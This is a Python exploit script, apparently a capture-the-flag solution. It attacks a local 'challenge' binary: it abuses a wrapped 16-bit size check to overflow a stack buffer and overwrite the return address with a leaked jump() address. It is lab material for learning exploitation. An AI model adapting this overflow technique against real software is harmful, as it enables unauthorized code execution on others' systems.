#!/usr/bin/env python3
import os
import pty
import re
import struct
import sys
import termios
import select
import time


CHUNK_COUNT = 8193  # 8193 * 8 = 65544, but uint16_t check sees only 8.
RET_OFFSET = 88


def read_until(fd: int, marker: str, timeout: float = 2.0) -> bytes:
    data = b""
    end = time.time() + timeout
    marker_b = marker.encode()
    while time.time() < end:
        r, _, _ = select.select([fd], [], [], 0.1)
        if not r:
            continue
        chunk = os.read(fd, 4096)
        if not chunk:
            break
        data += chunk
        if marker_b in data:
            return data
    raise RuntimeError(f"Timed out waiting for marker: {marker}")


def read_rest(fd: int, timeout: float = 1.0) -> bytes:
    out = b""
    end = time.time() + timeout
    while time.time() < end:
        r, _, _ = select.select([fd], [], [], 0.1)
        if not r:
            continue
        try:
            chunk = os.read(fd, 4096)
        except OSError:
            break
        if not chunk:
            break
        out += chunk
    return out


def main() -> None:
    master_fd, slave_fd = pty.openpty()
    attrs = termios.tcgetattr(slave_fd)
    attrs[3] &= ~(termios.ECHO | termios.ICANON)
    termios.tcsetattr(slave_fd, termios.TCSANOW, attrs)

    pid = os.fork()
    if pid == 0:
        os.setsid()
        os.dup2(slave_fd, 0)
        os.dup2(slave_fd, 1)
        os.dup2(slave_fd, 2)
        os.close(master_fd)
        os.close(slave_fd)
        os.execv("./challenge", ["./challenge"])

    os.close(slave_fd)

    banner = read_until(master_fd, "How many 8-byte chunks?")
    text = banner.decode("latin1", errors="ignore")
    sys.stdout.write(text)

    jump_match = re.search(r"jump\(\) @ (0x[0-9a-fA-F]+)", text)
    if not jump_match:
        raise RuntimeError("Failed to parse jump() address leak")
    jump_addr = int(jump_match.group(1), 16)

    os.write(master_fd, f"{CHUNK_COUNT}\n".encode())
    prompt = read_until(master_fd, "Send payload:")
    sys.stdout.write(prompt.decode("latin1", errors="ignore"))

    payload = b"A" * RET_OFFSET + struct.pack("<Q", jump_addr)
    os.write(master_fd, payload)

    out = read_rest(master_fd)
    sys.stdout.write(out.decode("latin1", errors="ignore"))

    try:
        _, status = os.waitpid(pid, os.WNOHANG)
        if status == 0:
            os.kill(pid, 9)
            os.waitpid(pid, 0)
    except OSError:
        pass

    os.close(master_fd)


if __name__ == "__main__":
    main()
